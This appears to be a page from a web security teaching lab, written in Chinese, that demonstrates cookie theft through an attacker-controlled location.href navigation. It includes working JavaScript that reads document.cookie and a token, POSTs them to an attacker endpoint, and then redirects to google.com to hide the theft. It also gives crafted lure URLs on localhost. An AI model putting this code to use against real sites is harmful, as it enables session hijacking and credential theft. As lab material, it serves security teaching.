😈 Case2 攻击：Location 导航 Cookie 窃取

🎯 攻击原理

受害者在 case2-search.html 页面中使用 location.href、location.assign() 或 location.replace() 进行页面导航时，如果目标 URL 可以被攻击者控制，攻击者可以构造一个恶意 URL， 将用户重定向到自己的恶意页面，从而窃取受害者的 cookie。

攻击流程：

  1. 攻击者准备一个恶意页面（当前页面），该页面会读取 document.cookie
  2. 攻击者构造恶意 URL，指向自己的恶意页面
  3. 攻击者诱导受害者在 case2-search.html 的"直接打开链接"输入框中输入这个恶意 URL
  4. 受害者点击"在当前窗口打开"或"在新标签打开"时，会导航到攻击者的恶意页面
  5. 恶意页面自动读取 cookie 并发送到攻击者服务器
  6. 攻击者在后台查看窃取的 cookie

💻 攻击代码展示

// 恶意页面（attacker-case2.html）的代码 // 当受害者通过 location.href 或 location.assign() 导航到此页面时，自动执行以下代码
// 1. 读取当前页面的所有 cookie const cookies = document.cookie;
// 2. 提取 case2Token（如果存在） const case2Token = cookies .split('; ') .find(c => c.startsWith('case2Token=')) ?.split('=')[1];
// 3. 将 cookie 发送到攻击者服务器 fetch('/api/attacker/steal', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ caseId: 'case2', attackType: 'location_navigation', cookies: cookies, case2Token: case2Token, referer: document.referrer, userAgent: navigator.userAgent }) });
// 4. 可选：立即跳转回正常页面，让受害者不易察觉 setTimeout(() => { window.location.href = 'https://www.google.com'; }, 500);

🔗 恶意 URL 构造

攻击者需要构造以下 URL，让受害者在 case2-search.html 中使用：

http://localhost:8080/attacker-case2.html
// 或者更隐蔽的方式，伪装成正常的搜索 URL： http://localhost:8080/attacker-case2.html?q=search&redirect=google.com

在 case2-search.html 中，如果用户在"直接打开链接"输入框中输入上述 URL， 点击"在当前窗口打开"时，location.href 会导航到此恶意页面。
